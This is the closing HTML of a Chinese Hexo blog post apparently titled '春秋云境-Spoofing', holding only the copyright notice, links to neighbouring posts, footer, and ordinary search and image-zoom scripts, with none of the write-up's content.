</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/7ea084a1/" title="春秋云境-Spoofing">https://tao0845.github.io/posts/7ea084a1/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/9aa9ec9/" rel="prev" title="春秋云境-Time"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">春秋云境-Time</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/93b35a6e/" rel="next" title="春秋云境-Delegation"><span class="post-nav-text">春秋云境-Delegation</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>